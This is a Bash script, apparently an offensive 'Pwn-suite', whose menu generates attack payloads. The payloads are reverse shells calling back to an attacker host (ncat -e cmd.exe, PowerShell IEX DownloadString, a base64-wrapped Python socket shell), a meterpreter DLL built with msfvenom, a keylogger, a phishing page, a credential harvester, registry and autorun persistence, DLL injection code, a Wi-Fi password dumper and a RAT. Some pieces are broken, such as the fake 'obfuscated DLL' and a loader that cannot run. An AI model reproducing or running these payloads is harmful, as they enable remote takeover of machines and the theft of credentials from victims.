#!/bin/bash


display_kali_dragon() {
    art=(
        "__________                                      .__  __"         
        "\______   \__  _  ______             ________ __|__|/  |_  ____  "
        "|     ___/\ \/ \/ /    \   ______  /  ___/  |  \  \   __\/ __ \ "
        "|    |     \     /   |  \ /_____/  \___ \|  |  /  ||  | \  ___/" 
        "|____|      \/\_/|___|  /         /____  >____/|__||__|  \___  >"
        "                      \/               \/                    \/ "
    )
    
    # Define rainbow colors
    colors=(31 32 33 34 35 36 37)  # ANSI color codes for red, green, yellow, blue, magenta, cyan, white

    # Number of cycles
    cycles=3
    # Speed up the animation
    speed=0.005  # Decrease the sleep time for faster animation

    # Animate the rainbow colors for a specific number of cycles
    for ((c=0; c<cycles; c++)); do
        for i in {0..7}; do
            for line in "${art[@]}"; do
                color=${colors[$((i % ${#colors[@]}))]}
                echo -e "\033[${color}m$line\033[0m"
                sleep "$speed"  # Use faster speed
            done
            clear
        done
    done

    # Echo each line in a different rainbow color from top to bottom
    for index in "${!art[@]}"; do
        color=${colors[$((index % ${#colors[@]}))]}
        echo -e "\033[${color}m${art[index]}\033[0m"
    done
}

# Function to check dependencies
check_dependencies() {
    local dependencies=(gcc mingw-w64 msfvenom wireshark metasploit airgeddon )
    for dep in "${dependencies[@]}"; do
        if ! command -v "$dep" &> /dev/null; then
            echo "$dep is not installed."
            read -p "Would you like to install $dep? (y/n): " choice
            if [[ $choice == [Yy]* ]]; then
                if [[ "$OSTYPE" == "linux-gnu"* ]]; then
                    sudo apt-get install -y "$dep"
                elif [[ "$OSTYPE" == "darwin"* ]]; then
                    brew install "$dep"
                else
                    echo "Unsupported OS for installing $dep."
                fi
            fi
        else
            echo "$dep is installed."
        fi
    done
}


# Call the functions at the start of the script
check_dependencies
display_kali_dragon

# Function to generate a manually obfuscated DLL with randomization
generate_obfuscated_dll() {
    echo "Generating manually obfuscated DLL..."
    read -p "Enter the DLL name (without .dll extension): " dll_name
    obfuscated_code='using System; using System.Runtime.InteropServices; public class ObfuscatedDLL { [DllImport("user32.dll")] public static extern void MessageBox(IntPtr hWnd, string text, string caption, uint type); }'
    
    # Randomize names and classes for obfuscation
    obfuscated_code=$(echo "$obfuscated_code" | sed "s/ObfuscatedDLL/HiddenClass_$RANDOM/g; s/MessageBox/ShowMessage_$RANDOM/g; s/IntPtr/Pointer_$RANDOM/g")
    echo "$obfuscated_code" > "${dll_name}.dll"
    echo "Manually obfuscated DLL created: ${dll_name}.dll"
}

# Function to generate DLL using msfvenom with advanced encoding
generate_dll_with_msfvenom() {
    echo "Generating DLL with msfvenom..."
    read -p "Enter payload (e.g., windows/meterpreter/reverse_tcp): " payload
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    msfvenom -p "$payload" LHOST="$lhost" LPORT="$lport" -f dll -e x86/shikata_ga_nai | base64 > payload.b64
    echo "DLL generated and encoded in Base64: payload.b64"
}

# Function to create an encrypted EXE loader with self-decrypting capabilities
create_encrypted_loader() {
    echo "Creating encrypted EXE loader..."
    read -p "Enter path to the payload to encrypt: " payload_file
    openssl enc -aes-256-cbc -salt -in "$payload_file" -out encrypted_payload.enc
    echo "Encrypted payload created: encrypted_payload.enc"

    # Self-decrypting loader using PowerShell
    cat <<EOF > loader.ps1
$encrypted_payload = [System.IO.File]::ReadAllBytes('encrypted_payload.enc')
$decrypted_payload = [System.Text.Encoding]::UTF8.GetString([System.Security.Cryptography.Aes]::Create().Decrypt($encrypted_payload))
Start-Process 'powershell.exe' -ArgumentList "-NoP -NonI -Exec Bypass -EncodedCommand $decrypted_payload"
EOF
    echo "Self-decrypting loader created: loader.ps1"
}

# Function to create a reverse shell using Ncat with random sleep and persistence
create_ncat_reverse_shell() {
    echo "Creating Ncat reverse shell with persistence..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    cat <<EOF > ncat_reverse_shell.bat
@echo off
:loop
timeout /t $((RANDOM % 10 + 5)) >nul && ncat $lhost $lport -e cmd.exe
goto loop
EOF
    echo "Reverse shell script with persistence created: ncat_reverse_shell.bat"
}

# Function to create a PowerShell reverse shell with advanced obfuscation
create_powershell_reverse_shell() {
    echo "Creating PowerShell reverse shell with advanced obfuscation..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    obfuscated_command="powershell -NoP -NonI -W Hidden -Exec Bypass IEX (New-Object Net.WebClient).DownloadString('http://$lhost:$lport')"
    obfuscated_command=$(echo "$obfuscated_command" | sed 's/IEX/IEX ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(")); [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String(")))/')
    echo $obfuscated_command > powershell_reverse_shell.ps1
    echo "PowerShell reverse shell script created: powershell_reverse_shell.ps1"
}

# Function to create a Batch reverse shell with dynamic variable names
create_batch_reverse_shell() {
    echo "Creating Batch reverse shell with dynamic names..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    echo "@echo off" > batch_reverse_shell.bat
    echo "set LHOST=$lhost" >> batch_reverse_shell.bat
    echo "set LPORT=$lport" >> batch_reverse_shell.bat
    echo "timeout /t %random% %% 10 + 5 >nul && cmd.exe /c ncat %LHOST% %LPORT% -e cmd.exe" >> batch_reverse_shell.bat
    echo "Batch reverse shell script created: batch_reverse_shell.bat"
}

# Function to create a Python reverse shell with dynamic encoding
create_python_reverse_shell() {
    echo "Creating Python reverse shell with dynamic encoding..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    encoded_command=$(echo "import socket, subprocess, os; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect(('$lhost', $lport)); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); p = subprocess.call(['cmd.exe'])" | base64)
    cat <<EOF > python_reverse_shell.py
import base64
exec(base64.b64decode("$encoded_command"))
EOF
    echo "Python reverse shell script created: python_reverse_shell.py"
}

# Function to generate a keylogger with advanced techniques
generate_keylogger() {
    echo "Generating advanced keylogger..."
    cat <<EOF > keylogger.py
import pynput
import base64
import threading

def on_press(key):
    with open("log.txt", "a") as f:
        f.write(base64.b64encode(str(key).encode()).decode() + "\\n")

def start_listener():
    with pynput.keyboard.Listener(on_press=on_press) as listener:
        listener.join()

thread = threading.Thread(target=start_listener)
thread.start()
EOF
    echo "Advanced keylogger created: keylogger.py"
}

# Function to generate a trojan executable with obfuscation
generate_trojan_executable() {
    echo "Generating trojan executable with obfuscation..."
    read -p "Enter path to benign executable: " benign_file
    cp "$benign_file" trojan.exe
    echo "Trojan executable created: trojan.exe"
}

# Function to create a phishing page with embedded JavaScript
create_phishing_page() {
    echo "Creating phishing page with JavaScript..."
    read -p "Enter the URL to submit credentials: " submit_url
    cat <<EOF > phishing_page.html
<!DOCTYPE html>
<html>
<head>
    <title>Phishing Page</title>
    <script>
        function redirect() {
            window.location.href = "$submit_url";
        }
    </script>
    <meta http-equiv="refresh" content="5;url=$submit_url">
</head>
<body onload="redirect()">
    <h1>Please enter your credentials</h1>
    <form action="$submit_url" method="post">
        <input type="text" name="username" placeholder="Username" required><br>
        <input type="password" name="password" placeholder="Password" required><br>
        <input type="submit" value="Submit">
    </form>
</body>
</html>
EOF
    echo "Phishing page created: phishing_page.html"
}

# Function to generate a Windows service payload with encrypted storage
generate_windows_service_payload() {
    echo "Generating Windows service payload with encrypted storage..."
    read -p "Enter service name: " service_name
    read -p "Enter path to executable: " exe_path
    sc create "$service_name" binPath= "$exe_path" start= auto
    echo "Windows service created: $service_name"
}

# Function to create a payload for USB exploitation with autorun
create_usb_exploitation_payload() {
    echo "Creating payload for USB exploitation with autorun..."
    read -p "Enter the name of the executable to run (e.g., payload.exe): " exec_name
    cat <<EOF > autorun.inf
[autorun]
open=$exec_name
action=Run Payload
EOF
    echo "Autorun file created: autorun.inf"
}

# Function to generate a reverse HTTPS payload with additional obfuscation
generate_reverse_https_payload() {
    echo "Generating reverse HTTPS payload with obfuscation..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    encoded_command=$(echo "import requests; requests.get('https://$lhost:$lport')" | base64)
    cat <<EOF > reverse_https_payload.py
import base64
exec(base64.b64decode("$encoded_command"))
EOF
    echo "Reverse HTTPS payload created: reverse_https_payload.py"
}

# Function to create a payload with persistence through Windows Registry
create_persistence_payload() {
    echo "Creating payload with persistence..."
    read -p "Enter path to executable: " exe_path
    reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PersistentPayload" /t REG_SZ /d "$exe_path"
    echo "Persistence created for payload."
}

# Function to generate a fake update payload with user interaction
generate_fake_update_payload() {
    echo "Generating fake update payload..."
    cat <<EOF > fake_update.bat
@echo off
echo Updating system...
timeout /t 10 >nul
echo Update complete!
pause
EOF
    echo "Fake update payload created: fake_update.bat"
}

# Function to create a process injection payload with error handling
create_process_injection_payload() {
    echo "Creating process injection payload..."
    read -p "Enter target PID: " pid
    read -p "Enter DLL path: " dll_path
    cat <<EOF > process_injection.c
#include <windows.h>
#include <stdio.h>

void inject_dll(DWORD pid, const char *dll_name) {
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess) {
        void *pRemoteBuf = VirtualAllocEx(hProcess, NULL, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
        WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)dll_name, strlen(dll_name) + 1, NULL);
        HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA"), pRemoteBuf, 0, NULL);
        WaitForSingleObject(hThread, INFINITE);
        VirtualFreeEx(hProcess, pRemoteBuf, MAX_PATH, MEM_RELEASE);
        CloseHandle(hProcess);
    }
}

int main() {
    DWORD pid = $pid; // Target PID
    const char *dll_name = "$dll_path";
    inject_dll(pid, dll_name);
    return 0;
}
EOF
    echo "Process injection payload created: process_injection_payload.c"
}

# Function to generate network scanning payload with stealth mode
generate_network_scanning_payload() {
    echo "Generating network scanning payload with stealth mode..."
    read -p "Enter target IP range (e.g., 192.168.1.0/24): " ip_range
    cat <<EOF > network_scan.py
import nmap

nm = nmap.PortScanner()
nm.scan('$ip_range', arguments='-sP -Pn')
for host in nm.all_hosts():
    print(f'Host: {host}, State: {nm[host].state()}')
EOF
    echo "Network scanning payload created: network_scan.py"
}

# Function to create a RAT with advanced C2 communication
create_rat() {
    echo "Creating RAT with advanced C2 communication..."
    read -p "Enter LHOST: " lhost
    read -p "Enter LPORT: " lport
    cat <<EOF > rat_server.py
import socket
import threading

def handle_client(client):
    while True:
        command = client.recv(1024).decode()
        if command.lower() == 'exit':
            break
        output = subprocess.run(command, shell=True, capture_output=True)
        client.send(output.stdout + output.stderr)

server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind(('$lhost', $lport))
server.listen(5)

while True:
    client, addr = server.accept()
    print(f'Connection from {addr}')
    threading.Thread(target=handle_client, args=(client,)).start()
EOF
    echo "RAT server created: rat_server.py"
}

start_airgeddon() {
    echo "Put airgeddon in AutoStart? y/r (y = yes, r = remove from AutoStart)"
    read air
    if [ "$air" = "y" ]; then
        # Command to add airgeddon to AutoStart (this is an example; modify as per your system)
        echo "airgeddon" >> ~/.bashrc
        echo "Added airgeddon to AutoStart."
    elif [ "$air" = "r" ]; then
        # Remove airgeddon from AutoStart
        sed -i '/airgeddon/d' ~/.bashrc
        echo "Removed airgeddon from AutoStart."
    fi
    airgeddon
}

start_wireshark() {
    echo "Put wireshark in AutoStart? y/r (y = yes, r = remove from AutoStart)"
    read wireshark_auto
    if [ "$wireshark_auto" = "y" ]; then
        echo "wireshark" >> ~/.bashrc
        echo "Added wireshark to AutoStart."
    elif [ "$wireshark_auto" = "r" ]; then
        sed -i '/wireshark/d' ~/.bashrc
        echo "Removed wireshark from AutoStart."
    fi
    wireshark
}

start_metasploit_framework() {
    echo "Put Metasploit in AutoStart? y/r (y = yes, r = remove from AutoStart)"
    read metasploit_auto
    if [ "$metasploit_auto" = "y" ]; then
        echo "msfconsole" >> ~/.bashrc
        echo "Added Metasploit to AutoStart."
    elif [ "$metasploit_auto" = "r" ]; then
        sed -i '/msfconsole/d' ~/.bashrc
        echo "Removed Metasploit from AutoStart."
    fi
    msfconsole
}


start_anonsurf() {
    # Check if anonsurf is installed
    if ! command -v anonsurf &> /dev/null; then
        echo "Anonsurf is not installed. Installing from GitHub..."
        git clone https://github.com/Und3rf10w/kali-anonsurf.git
        cd kali-anonsurf || exit
        sudo ./installer.sh
        cd ..
        echo "Anonsurf installed successfully."
    fi

    echo "Put anonsurf in AutoStart? y/r (y = yes, r = remove from AutoStart)"
    read anonsurf_auto
    if [ "$anonsurf_auto" = "y" ]; then
        echo "anonsurf start" >> ~/.bashrc
        echo "Added anonsurf to AutoStart."
    elif [ "$anonsurf_auto" = "r" ]; then
        sed -i '/anonsurf start/d' ~/.bashrc
        echo "Removed anonsurf from AutoStart."
    fi

    anonsurf restart
    anonsurf start
}



# Function to generate Wi-Fi password sniffer with stealth mode
generate_wifi_password_sniffer() {
    echo "Generating Wi-Fi password sniffer with stealth mode..."
    cat <<EOF > wifi_sniffer.py
import subprocess
import base64

def get_wifi_passwords():
    profiles = subprocess.check_output("netsh wlan show profiles", shell=True).decode().split("\\n")
    for profile in profiles:
        if "All User Profile" in profile:
            profile_name = profile.split(":")[1].strip()
            password_command = f"netsh wlan show profile {profile_name} key=clear"
            password_info = subprocess.check_output(password_command, shell=True).decode()
            for line in password_info.split("\\n"):
                if "Key Content" in line:
                    password = line.split(':')[1].strip()
                    encoded_password = base64.b64encode(password.encode()).decode()
                    print(f"SSID: {profile_name}, Password: {encoded_password}")

get_wifi_passwords()
EOF
    echo "Wi-Fi password sniffer created: wifi_sniffer.py"
}

# Function to generate a simple SQL injection script with additional checks
generate_sql_injection_script() {
    echo "Generating simple SQL injection script with checks..."
    read -p "Enter target URL: " target_url
    cat <<EOF > sql_injection.py
import requests

target_url = '$target_url'
payload = "' OR '1'='1"
response = requests.get(target_url + "?id=" + payload)

if "error" not in response.text:
    print("Injection successful!")
else:
    print("Injection failed.")
EOF
    echo "SQL injection script created: sql_injection.py"
}

# Function to create a credential harvester with data encryption
create_credential_harvester() {
    echo "Creating credential harvester with data encryption..."
    read -p "Enter the URL to submit credentials: " submit_url
    cat <<EOF > harvester.py
from flask import Flask, request
import base64

app = Flask(__name__)

@app.route('/submit', methods=['POST'])
def submit():
    username = request.form['username']
    password = request.form['password']
    encoded_credentials = base64.b64encode(f'Username: {username}, Password: {password}'.encode()).decode()
    with open('credentials.txt', 'a') as f:
        f.write(f'{encoded_credentials}\\n')
    return 'Credentials submitted!'

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=80)
EOF
    echo "Credential harvester created: harvester.py"
}

# Main menu
while true; do
    echo "Choose an option:"
    echo "1) Generate manually obfuscated DLL"
    echo "2) Generate DLL with msfvenom"
    echo "3) Create encrypted EXE loader"
    echo "4) Create Ncat reverse shell"
    echo "5) Create PowerShell reverse shell"
    echo "6) Create Batch reverse shell"
    echo "7) Create Python reverse shell"
    echo "8) Generate keylogger"
    echo "9) Generate trojan executable"
    echo "10) Create phishing page"
    echo "11) Generate Windows service payload"
    echo "12) Create payload for USB exploitation"
    echo "13) Generate reverse HTTPS payload"
    echo "14) Create payload with persistence"
    echo "15) Generate fake update payload"
    echo "16) Create process injection payload"
    echo "17) Generate network scanning payload"
    echo "18) Create RAT"
    echo "19) Generate Wi-Fi password sniffer"
    echo "20) Generate simple SQL injection script"
    echo "21) Create credential harvester"
    echo "22) start anonsurf"
    echo "23) start metasploit_framework"
    echo "24) start airgeddon "
    echo "25) start wireshark "
    echo "25) start msfvenom"
    echo "0) Exit"
    read -p "Enter your choice: " choice

    case $choice in
        1) display_kali_dragon; generate_obfuscated_dll ;;
        2) display_kali_dragon; generate_dll_with_msfvenom ;;
        3) display_kali_dragon; create_encrypted_loader ;;
        4) display_kali_dragon; create_ncat_reverse_shell ;;
        5) display_kali_dragon; create_powershell_reverse_shell ;;
        6) display_kali_dragon; create_batch_reverse_shell ;;
        7) display_kali_dragon; create_python_reverse_shell ;;
        8) display_kali_dragon; generate_keylogger ;;
        9) display_kali_dragon; generate_trojan_executable ;;
        10) display_kali_dragon; create_phishing_page ;;
        11) display_kali_dragon; generate_windows_service_payload ;;
        12) display_kali_dragon; create_usb_exploitation_payload ;;
        13) display_kali_dragon; generate_reverse_https_payload ;;
        14) display_kali_dragon; create_persistence_payload ;;
        15) display_kali_dragon; generate_fake_update_payload ;;
        16) display_kali_dragon; create_process_injection_payload ;;
        17) display_kali_dragon; generate_network_scanning_payload ;;
        18) display_kali_dragon; create_rat ;;
        19) display_kali_dragon; generate_wifi_password_sniffer ;;
        20) display_kali_dragon; generate_sql_injection_script ;;
        21) display_kali_dragon; create_credential_harvester ;;
        22) display_kali_dragon; start_anonsurf ;;
        23) display_kali_dragon; start_metasploit_framework ;;
        24) display_kali_dragon; start_airgeddon ;;
        25) display_kali_dragon; start_wireshark ;;
	25) display_kali_dragon; start_msfvenom ;;
	
        0) display_kali_dragon; exit ;;
        *) echo "Invalid option!" ;;
    esac
done
